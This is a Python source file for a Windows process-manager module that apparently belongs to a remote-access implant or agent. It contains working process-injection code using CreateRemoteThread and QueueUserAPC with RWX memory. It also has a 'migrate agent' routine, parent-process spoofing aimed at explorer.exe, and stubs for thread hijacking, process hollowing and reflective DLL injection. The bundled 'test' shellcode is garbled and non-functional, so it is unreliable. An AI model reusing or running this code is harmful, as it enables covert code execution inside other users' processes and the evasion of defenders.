import ctypes, ctypes.wintypes, psutil, subprocess, os, sys, time, struct, threading
from ctypes import wintypes
import win32api, win32con, win32process, win32security, win32event

class ProcessManager:
    def __init__(self):
        self.kernel32 = ctypes.windll.kernel32
        self.ntdll = ctypes.windll.ntdll
        self.user32 = ctypes.windll.user32
        self.current_pid = os.getpid()
        
    def list(self, detailed=True):
        """List all running processes."""
        processes = []
        
        for proc in psutil.process_iter(['pid', 'name', 'username', 'memory_percent', 'cpu_percent']):
            try:
                info = proc.info
                
                if detailed:
                    # Get additional info
                    try:
                        exe_path = proc.exe()
                        cmdline = proc.cmdline()
                        create_time = proc.create_time()
                        threads = proc.num_threads()
                        handles = proc.num_handles()
                    except:
                        exe_path = cmdline = create_time = threads = handles = None
                    
                    process_info = {
                        'pid': info['pid'],
                        'name': info['name'],
                        'user': info['username'],
                        'memory': info['memory_percent'],
                        'cpu': info['cpu_percent'],
                        'exe': exe_path,
                        'cmdline': cmdline,
                        'created': create_time,
                        'threads': threads,
                        'handles': handles,
                        'status': proc.status()
                    }
                else:
                    process_info = {
                        'pid': info['pid'],
                        'name': info['name'],
                        'user': info['username']
                    }
                
                processes.append(process_info)
                
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                continue
        
        return processes
    
    def kill(self, pid, force=False):
        """Kill a process by PID."""
        try:
            proc = psutil.Process(pid)
            
            if force:
                proc.kill()
            else:
                proc.terminate()
            
            # Wait for termination
            gone, alive = psutil.wait_procs([proc], timeout=3)
            
            if alive:
                # Force kill if still alive
                for p in alive:
                    p.kill()
                return f"Process {pid} force killed"
            else:
                return f"Process {pid} terminated"
                
        except psutil.NoSuchProcess:
            return f"Process {pid} does not exist"
        except psutil.AccessDenied:
            # Try Windows API
            return self.kill_with_api(pid)
    
    def kill_with_api(self, pid):
        """Kill process using Windows API."""
        PROCESS_TERMINATE = 0x0001
        
        hProcess = self.kernel32.OpenProcess(PROCESS_TERMINATE, False, pid)
        if hProcess:
            if self.kernel32.TerminateProcess(hProcess, 0):
                self.kernel32.CloseHandle(hProcess)
                return f"Process {pid} terminated via API"
            self.kernel32.CloseHandle(hProcess)
        
        return f"Failed to terminate process {pid}"
    
    def suspend(self, pid):
        """Suspend a process."""
        try:
            proc = psutil.Process(pid)
            
            # Use NtSuspendProcess if available
            if hasattr(self.ntdll, 'NtSuspendProcess'):
                hProcess = self.kernel32.OpenProcess(0x0400, False, pid)  # PROCESS_SUSPEND_RESUME
                if hProcess:
                    self.ntdll.NtSuspendProcess(hProcess)
                    self.kernel32.CloseHandle(hProcess)
                    return f"Process {pid} suspended"
            
            # Fallback: suspend all threads
            for thread in proc.threads():
                try:
                    hThread = self.kernel32.OpenThread(0x0002, False, thread.id)  # THREAD_SUSPEND_RESUME
                    if hThread:
                        self.kernel32.SuspendThread(hThread)
                        self.kernel32.CloseHandle(hThread)
                except:
                    pass
            
            return f"Process {pid} threads suspended"
            
        except Exception as e:
            return f"Failed to suspend process {pid}: {e}"
    
    def resume(self, pid):
        """Resume a suspended process."""
        try:
            # Use NtResumeProcess if available
            if hasattr(self.ntdll, 'NtResumeProcess'):
                hProcess = self.kernel32.OpenProcess(0x0400, False, pid)
                if hProcess:
                    self.ntdll.NtResumeProcess(hProcess)
                    self.kernel32.CloseHandle(hProcess)
                    return f"Process {pid} resumed"
            
            # Fallback: resume all threads
            proc = psutil.Process(pid)
            for thread in proc.threads():
                try:
                    hThread = self.kernel32.OpenThread(0x0002, False, thread.id)
                    if hThread:
                        self.kernel32.ResumeThread(hThread)
                        self.kernel32.CloseHandle(hThread)
                except:
                    pass
            
            return f"Process {pid} threads resumed"
            
        except Exception as e:
            return f"Failed to resume process {pid}: {e}"
    
    def inject(self, pid, payload=None, method='create_remote_thread'):
        """Inject code into a process."""
        if not payload:
            # Default: inject a message box
            payload = self.generate_messagebox_payload()
        
        methods = {
            'create_remote_thread': self.inject_create_remote_thread,
            'queue_user_apc': self.inject_queue_user_apc,
            'thread_hijack': self.inject_thread_hijack,
            'process_hollowing': self.inject_process_hollowing,
            'reflective_dll': self.inject_reflective_dll
        }
        
        if method in methods:
            return methods[method](pid, payload)
        else:
            return f"Unknown injection method: {method}"
    
    def inject_create_remote_thread(self, pid, payload):
        """Inject using CreateRemoteThread (classic)."""
        PROCESS_ALL_ACCESS = 0x1F0FFF
        
        # Open target process
        hProcess = self.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
        if not hProcess:
            return "Failed to open process"
        
        try:
            # Allocate memory in target process
            mem_size = len(payload)
            remote_mem = self.kernel32.VirtualAllocEx(
                hProcess, None, mem_size, 
                0x3000, 0x40  # MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE
            )
            
            if not remote_mem:
                self.kernel32.CloseHandle(hProcess)
                return "Failed to allocate remote memory"
            
            # Write payload to remote memory
            written = ctypes.c_size_t(0)
            self.kernel32.WriteProcessMemory(
                hProcess, remote_mem, payload, mem_size, ctypes.byref(written)
            )
            
            if written.value != mem_size:
                self.kernel32.VirtualFreeEx(hProcess, remote_mem, 0, 0x8000)  # MEM_RELEASE
                self.kernel32.CloseHandle(hProcess)
                return "Failed to write payload"
            
            # Create remote thread
            thread_id = ctypes.c_ulong(0)
            hThread = self.kernel32.CreateRemoteThread(
                hProcess, None, 0, remote_mem, None, 0, ctypes.byref(thread_id)
            )
            
            if not hThread:
                self.kernel32.VirtualFreeEx(hProcess, remote_mem, 0, 0x8000)
                self.kernel32.CloseHandle(hProcess)
                return "Failed to create remote thread"
            
            # Wait for thread to complete
            self.kernel32.WaitForSingleObject(hThread, 5000)
            
            # Cleanup
            self.kernel32.CloseHandle(hThread)
            self.kernel32.VirtualFreeEx(hProcess, remote_mem, 0, 0x8000)
            self.kernel32.CloseHandle(hProcess)
            
            return f"Injection successful. Thread ID: {thread_id.value}"
            
        except Exception as e:
            if hProcess:
                self.kernel32.CloseHandle(hProcess)
            return f"Injection failed: {e}"
    
    def inject_queue_user_apc(self, pid, payload):
        """Inject using QueueUserAPC (requires alertable thread)."""
        PROCESS_ALL_ACCESS = 0x1F0FFF
        
        hProcess = self.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
        if not hProcess:
            return "Failed to open process"
        
        try:
            # Allocate and write payload
            mem_size = len(payload)
            remote_mem = self.kernel32.VirtualAllocEx(
                hProcess, None, mem_size, 0x3000, 0x40
            )
            
            if not remote_mem:
                self.kernel32.CloseHandle(hProcess)
                return "Failed to allocate remote memory"
            
            written = ctypes.c_size_t(0)
            self.kernel32.WriteProcessMemory(
                hProcess, remote_mem, payload, mem_size, ctypes.byref(written)
            )
            
            # Find an alertable thread in target process
            thread_id = self.find_alertable_thread(pid)
            if not thread_id:
                self.kernel32.VirtualFreeEx(hProcess, remote_mem, 0, 0x8000)
                self.kernel32.CloseHandle(hProcess)
                return "No alertable thread found"
            
            # Open thread
            THREAD_ALL_ACCESS = 0x1F03FF
            hThread = self.kernel32.OpenThread(THREAD_ALL_ACCESS, False, thread_id)
            if not hThread:
                self.kernel32.VirtualFreeEx(hProcess, remote_mem, 0, 0x8000)
                self.kernel32.CloseHandle(hProcess)
                return "Failed to open thread"
            
            # Queue APC
            result = self.kernel32.QueueUserAPC(remote_mem, hThread, 0)
            
            self.kernel32.CloseHandle(hThread)
            self.kernel32.CloseHandle(hProcess)
            
            if result:
                return f"APC queued to thread {thread_id}"
            else:
                return "Failed to queue APC"
                
        except Exception as e:
            if hProcess:
                self.kernel32.CloseHandle(hProcess)
            return f"APC injection failed: {e}"
    
    def find_alertable_thread(self, pid):
        """Find an alertable thread in process."""
        try:
            proc = psutil.Process(pid)
            for thread in proc.threads():
                # Check if thread is in alertable wait (simplified)
                # In reality, you'd need to examine thread wait state
                return thread.id
        except:
            pass
        return None
    
    def inject_thread_hijack(self, pid, payload):
        """Inject by hijacking an existing thread."""
        # Implementation would involve suspending a thread,
        # changing its context to point to our payload,
        # then resuming it
        return "Thread hijack injection (simplified stub)"
    
    def inject_process_hollowing(self, pid, payload):
        """Process hollowing - create suspended process and replace its memory."""
        return "Process hollowing injection (simplified stub)"
    
    def inject_reflective_dll(self, pid, dll_data):
        """Reflective DLL injection - load DLL from memory."""
        return "Reflective DLL injection (simplified stub)"
    
    def generate_messagebox_payload(self):
        """Generate payload that shows a message box (for testing)."""
        # Shellcode that calls MessageBoxA
        # This is architecture-specific and would need proper generation
        # Simplified example for x64:
        shellcode = (
            b"\x48\x83\xEC\x28"              # sub rsp, 28h
            b"\x48\x31\xC9"                  # xor rcx, rcx
            b"\x48\x31\xD2"                  # xor rdx, rdx
            b"\x49\xB8\x41\x45\x54\x48\x45\x52\x20\x52"  # mov r8, 'R AETHER'
            b"\x49\xC1\xE0\x20"              # shl r8, 20h
            b"\x49\xB8\x4F\x43\x4B\x53\x21\x00\x00\x00"  # mov r8, '!!SKCOR'
            b"\x48\x31\xC0"                  # xor rax, rax
            b"\xFF\xD0"                      # call rax
            b"\x48\x83\xC4\x28"              # add rsp, 28h
            b"\xC3"                          # ret
        )
        return shellcode
    
    def migrate(self, target_pid):
        """Migrate agent to another process."""
        current_pid = self.current_pid
        
        if target_pid == current_pid:
            return "Cannot migrate to same process"
        
        # Get current executable path
        current_exe = sys.executable
        
        # Inject a new instance of ourselves into target process
        # This is simplified - real migration would transfer state
        try:
            result = self.inject(target_pid, method='create_remote_thread')
            return f"Migration attempted: {result}"
        except Exception as e:
            return f"Migration failed: {e}"
    
    def spoof_parent(self, new_parent_pid=None):
        """Spoof parent process ID."""
        if new_parent_pid is None:
            # Use a common benign parent like explorer.exe
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'] == 'explorer.exe':
                    new_parent_pid = proc.info['pid']
                    break
        
        if not new_parent_pid:
            return "No suitable parent process found"
        
        # This requires more advanced techniques
        # (e.g., modifying PEB, using process creation flags)
        return f"Parent spoofing would target PID: {new_parent_pid}"
    
    def change_memory_protection(self):
        """Change memory protection of agent's code sections."""
        try:
            # Get base address of our module
            base_address = self.get_module_base_address()
            
            # Query current protection
            mbi = self.MEMORY_BASIC_INFORMATION()
            result = self.kernel32.VirtualQuery(base_address, ctypes.byref(mbi), ctypes.sizeof(mbi))
            
            if result:
                # Change to RX (read-execute) from RWX
                old_protect = wintypes.DWORD(0)
                self.kernel32.VirtualProtect(
                    base_address, mbi.RegionSize, 
                    0x20,  # PAGE_EXECUTE_READ
                    ctypes.byref(old_protect)
                )
                return f"Memory protection changed from {old_protect.value:X} to PAGE_EXECUTE_READ"
            
            return "Failed to query memory information"
            
        except Exception as e:
            return f"Memory protection change failed: {e}"
    
    def get_module_base_address(self):
        """Get base address of current module."""
        # Get handle to our module
        hModule = self.kernel32.GetModuleHandleW(None)
        return hModule
    
    class MEMORY_BASIC_INFORMATION(ctypes.Structure):
        _fields_ = [
            ("BaseAddress", ctypes.c_void_p),
            ("AllocationBase", ctypes.c_void_p),
            ("AllocationProtect", wintypes.DWORD),
            ("PartitionId", wintypes.WORD),
            ("RegionSize", ctypes.c_size_t),
            ("State", wintypes.DWORD),
            ("Protect", wintypes.DWORD),
            ("Type", wintypes.DWORD)
        ]